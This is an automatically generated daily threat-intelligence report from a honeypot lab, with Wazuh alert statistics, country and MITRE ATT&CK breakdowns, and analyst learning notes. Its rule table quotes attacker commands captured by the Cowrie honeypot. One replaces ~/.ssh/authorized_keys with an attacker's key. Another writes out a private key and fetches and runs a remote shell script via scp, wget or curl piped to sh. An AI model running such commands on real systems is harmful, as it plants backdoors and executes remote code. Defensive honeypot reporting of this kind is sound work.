# LearningLab01 Daily Threat Intelligence Report — 2026-10-04

Generated: 2026-10-04T13:15:05.074Z

Report window: 2026-10-03T13:15:05.040Z through 2026-10-04T13:15:05.040Z

> This report summarizes security telemetry and honeypot activity. An alert indicates that a rule matched observed activity; it does not automatically prove that a system was compromised.

## Executive Summary

| Metric | Count |
|---|---:|
| Wazuh alerts | 393,379 |
| Attack-related alerts | 22,622 |
| Honeypot interactions | 375,162 |
| Authentication failures | 7,261 |
| Authentication successes | 465 |
| Critical alerts | 124 |
| High alerts | 470 |
| T-Pot artifacts observed | 0 |
| Malicious artifact detections | 0 |

### Notable Observations

- 124 critical-severity alerts require priority review.
- 470 high-severity alerts should be reviewed after the critical queue.
- Authentication failures exceeded successful authentications by a ratio of 15.62:1.
- Country attribution currently covers only 27.21% of alerts. Country totals should be treated as partial telemetry.
- The most frequent rule was 110219: T-Pot CiscoASA web activity from [IP address]: "GET /+CSCOE+/logon.html?fcadbadd=1 HTTP/1.1" 200 - (106,673 alerts).

## Wazuh Security Monitoring

### Alert Severity

| Severity | Alerts | Percentage |
|---|---:|---:|
| Critical | 124 | 0.03% |
| High | 470 | 0.12% |
| Medium | 2,164 | 0.55% |
| Low | 390,621 | 99.30% |
| Informational | 0 | 0.00% |

Severity represents the priority assigned by the Wazuh rule. Critical and high alerts should be investigated first, but repeated lower-severity events can also reveal scanning, credential attacks, or attacker preparation.

### Authentication Activity

- Authentication failures: 7,261
- Authentication successes: 465
- Failure-to-success ratio: 15.62:1

A successful authentication is not considered an attack by itself. Analysts should correlate successful logins with preceding failures, source addresses, usernames, target systems, and expected activity.

### Attack-Type Breakdown

| Category | Alerts | Percentage of attack-related alerts |
|---|---:|---:|
| Network attack | 12,886 | 56.96% |
| Payload delivery | 12,886 | 56.96% |
| Authentication failure | 7,261 | 32.10% |
| Command execution | 1,308 | 5.78% |
| Reconnaissance | 662 | 2.93% |
| Network scan | 271 | 1.20% |
| Malware | 117 | 0.52% |
| Web attack | 82 | 0.36% |
| SMTP attack | 18 | 0.08% |

> Category counts may overlap because one Wazuh alert can belong to multiple rule groups. The attack-related total counts each alert once.

### Country of Origin

Wazuh supplied country information for 107,056 alerts, representing 27.21% of all alerts.

| Country | Alerts | Percentage of all alerts | Relative volume |
|---|---:|---:|---|
| Unknown | 286,323 | 72.79% | Not geolocated |
| Russia | 48,480 | 12.32% | ████████████████████ |
| Kazakhstan | 28,069 | 7.14% | ████████████ |
| United States | 26,734 | 6.80% | ███████████ |
| Republic of Moldova | 2,244 | 0.57% | █ |
| Germany | 1,336 | 0.34% | █ |
| United Kingdom | 149 | 0.04% | █ |
| Netherlands | 10 | 0.00% | █ |
| Slovakia | 9 | 0.00% | █ |
| Japan | 7 | 0.00% | █ |
| Malta | 6 | 0.00% | █ |
| Austria | 3 | 0.00% | █ |
| China | 3 | 0.00% | █ |
| Singapore | 3 | 0.00% | █ |
| Canada | 2 | 0.00% | █ |
| Turkey | 1 | 0.00% | █ |

> Relative-volume bars compare only countries with known geographic attribution. Unknown alerts are excluded from the bar scale.

> Geolocation is approximate. VPNs, proxies, cloud providers, compromised hosts, carrier networks, and incomplete GeoIP coverage can make the apparent country different from the attacker’s location.

### MITRE ATT&CK Tactics

| Tactic | Alerts |
|---|---:|
| Defense Evasion | 292 |
| Initial Access | 291 |
| Persistence | 291 |
| Privilege Escalation | 291 |
| Credential Access | 114 |
| Lateral Movement | 97 |
| Execution | 25 |
| Impact | 11 |
| Command and Control | 8 |

### MITRE ATT&CK Techniques

| Technique | Alerts |
|---|---:|
| Valid Accounts | 291 |
| Brute Force | 114 |
| Remote Services | 97 |
| Command and Scripting Interpreter | 25 |
| Stored Data Manipulation | 11 |
| Ingress Tool Transfer | 8 |
| Disable or Modify Tools | 1 |

MITRE ATT&CK describes adversary behavior rather than declaring that an attack succeeded. These mappings help analysts connect individual alerts to possible attacker objectives and investigative hypotheses.

### Most Frequent Wazuh Rules

| Rule ID | Highest Level | Alerts | Description | Agents |
|---|---:|---:|---|---|
| 110219 | 4 | 106,673 | T-Pot CiscoASA web activity from [IP address]: "GET /+CSCOE+/logon.html?fcadbadd=1 HTTP/1.1" 200 - | tpot (106,673) |
| 110204 | 4 | 94,624 | T-Pot Honeytrap connection from [IP address] to port 5901 | tpot (94,624) |
| 110213 | 4 | 58,654 | T-Pot RDP connection from [IP address] to port 3389. | tpot (58,654) |
| 110209 | 5 | 54,906 | T-Pot Conpot snmp event from [IP address]: SNMPv2 Bulk | tpot (54,906) |
| 110207 | 5 | 46,036 | T-Pot SentryPeer SIP activity from [IP address]:22145, method INVITE | tpot (46,036) |
| 110205 | 6 | 12,821 | T-Pot Honeytrap received a payload from [IP address] | tpot (12,821) |
| 110101 | 3 | 8,507 | Cowrie SSH connection from [IP address]. | tpot (8,507) |
| 110102 | 5 | 7,261 | Cowrie failed login from [IP address] using username root. | tpot (7,261) |
| 110104 | 7 | 1,151 | Cowrie captured a command from [IP address]: enable | tpot (1,151) |
| 110201 | 4 | 469 | T-Pot Dionaea pptpd connection from [IP address] to port 1723 | tpot (469) |
| 110214 | 9 | 267 | T-Pot RDP honeypot detected a connection burst from [IP address]. | tpot (267) |
| 110222 | 9 | 258 | T-Pot CiscoASA detected repeated web requests from one source. | tpot (258) |
| 533 | 7 | 240 | Listened ports status (netstat) changed (new port opened or closed). | tpot (240) |
| 5501 | 3 | 194 | PAM: Login session opened. | tpot (192), wazuh (2) |
| 110103 | 10 | 174 | Cowrie accepted login from [IP address] using username root. | tpot (174) |
| 5502 | 3 | 171 | PAM: Login session closed. | tpot (169), wazuh (2) |
| 110109 | 13 | 124 | Cowrie captured a destructive, persistence, or defense-evasion command from [IP address]: cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ | tpot (124) |
| 110106 | 10 | 114 | Cowrie detected repeated failed logins from [IP address]. | tpot (114) |
| 5715 | 3 | 97 | sshd: authentication success. | tpot (96), wazuh (1) |
| 110221 | 7 | 95 | T-Pot CiscoASA detected configuration discovery from [IP address]: "GET /appGet.cgi?hook=get_cfg_clientlist() HTTP/1.1" 404 - | tpot (95) |
| 110105 | 12 | 84 | Cowrie captured a file download from [IP address]. | tpot (84) |
| 110223 | 5 | 81 | T-Pot HoneyAML received  request from  to  on port . | tpot (81) |
| 110216 | 4 | 67 | T-Pot Mailoney received SMTP command from [IP address]: BIGSIZE | tpot (67) |
| 110212 | 10 | 65 | T-Pot Honeytrap detected repeated payload activity from [IP address]. | tpot (65) |
| 110215 | 4 | 52 | T-Pot MiniPrint event: connection, action open_conn, Connection opened | tpot (52) |
| 110220 | 8 | 51 | T-Pot CiscoASA captured a login request from [IP address]: "POST /login.cgi HTTP/1.1" 200 - | tpot (51) |
| 510 | 7 | 41 | Host-based anomaly detection event (rootcheck). | wazuh (40), tpot (1) |
| 110108 | 12 | 25 | Cowrie captured suspicious execution or staging activity from $(src_ip): $(input) | tpot (25) |
| 110208 | 7 | 20 | T-Pot SentryPeer detected SIP scanner friendly-scanner from [IP address]:5062 | tpot (20) |
| 110217 | 7 | 18 | T-Pot Mailoney captured suspicious SMTP activity from [IP address]: rcpt to:<support@centrodeartecontemporaneo.com>  | tpot (18) |
| 592 | 8 | 11 | Log file size reduced. | tpot (11) |
| 110107 | 12 | 8 | Cowrie captured a probable payload-retrieval command from [IP address]: uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; cd /tmp \|\| cd /var/tmp \|\| cd /dev/shm; echo '-----BEGIN OPENSSH PRIVATE KEY-----; b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW; QyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxgAAAJAt8FDRLfBQ; 0QAAAAtzc2gtZWQyNTUxOQAAACDveEt+JtIVZGBVIbVkHvdkvQqdMiafu5/IMOvelH/yxg; AAAEAr1wl+3JHkjA3ZtPtjd8bAtLVFo13eZ12Aw2QnFXC/ie94S34m0hVkYFUhtWQe92S9; Cp0yJp+7n8gw696Uf/LGAAAACGRsckBzZnRwAQIDBAU=; -----END OPENSSH PRIVATE KEY-----' > key.ppk; echo 'StrictHostKeyChecking no; UserKnownHostsFile /dev/null' > sshcfg; chmod 400 key.ppk; scp -s -F sshcfg -i key.ppk dlr@[IP address]:sh out_sh; if [ $? -eq 0 ]; then chmod +x out_sh; sh out_sh ssh >/dev/null 2>&1; else (wget --no-check-certificate -qO- https://[IP address]/sh \|\| curl -sk https://[IP address]/sh) \| sh -s ssh; fi; rm -rf sshcfg key.ppk out_sh | tpot (8) |
| 110211 | 9 | 4 | T-Pot Dionaea detected a connection burst from [IP address]. | tpot (4) |
| 19004 | 7 | 2 | SCA summary: CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Score less than 50% (47) | tpot (2) |
| 19010 | 3 | 2 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure all AppArmor Profiles are in enforce or complain mode.: Status changed from failed to passed | tpot (2) |
| 19011 | 9 | 2 | CIS Ubuntu Linux 24.04 LTS Benchmark v1.0.0.: Ensure all AppArmor Profiles are in enforce or complain mode.: Status changed from passed to failed | tpot (2) |
| 203 | 9 | 2 | Agent event queue is full. Events may be lost. | tpot (2) |
| 11 | 4 | 1 | Unknown | tpot (1) |
| 110224 | 7 | 1 | T-Pot HoneyAML received an HTTP POST from [IP address] to /. | tpot (1) |
| 202 | 7 | 1 | Agent event queue is 90% full. | tpot (1) |
| 205 | 3 | 1 | Agent event queue is back to normal load. | tpot (1) |
| 503 | 3 | 1 | Wazuh agent started. | tpot (1) |
| 506 | 3 | 1 | Wazuh agent stopped. | tpot (1) |
| 591 | 3 | 1 | Log file rotated. | tpot (1) |
| 86003 | 3 | 1 | Docker: Error message | tpot (1) |

### New or Previously Unseen Detections

Historical novelty comparison is not enabled in the exporter yet. This section will compare the current report window with the preceding 30-day baseline. Until that comparison is enabled, no rule should be described as new solely because it appears in this report.

### SOC Analyst Learning Notes

1. Begin with critical and high alerts, but validate the underlying event.
2. Determine whether the event represents scanning, attempted access, payload delivery, execution, persistence, or impact.
3. Correlate source IP, username, target, timestamp, and related alerts.
4. Check whether a successful login followed repeated failures.
5. Separate honeypot interaction from activity against production assets.
6. Document evidence supporting both malicious and benign explanations.
7. Escalate based on confirmed risk, affected assets, and confidence—not alert volume alone.

## T-Pot Artifact Intelligence

### Artifact Summary

- Artifacts observed: 0
- Known hashes: 0
- Uploaded or analyzed: 0
- Malicious detections: 0
- Suspicious detections: 0
- Lookup errors: 0

### Artifacts

| SHA-256 | Bytes | Status | Malicious | Suspicious | Undetected | VirusTotal |
|---|---:|---|---:|---:|---:|---|
| No artifacts observed | — | — | — | — | — | — |

## Security Onion Network Monitoring

_Planned integration._

This section will eventually contain Suricata alerts, Zeek observations, network attack types, source-country information, targeted services, new network behaviors, and correlations with Wazuh endpoint alerts.

## Report Limitations

- Alert counts represent rule matches, not necessarily unique attackers.
- Attack-category counts may overlap.
- Honeypot traffic is intentionally exposed and is not equivalent to a compromise of a production system.
- GeoIP attribution is approximate and currently has incomplete coverage.
- VirusTotal results can change as vendors update their detections.

Generated automatically by the LearningLab01 threat-intelligence pipeline.
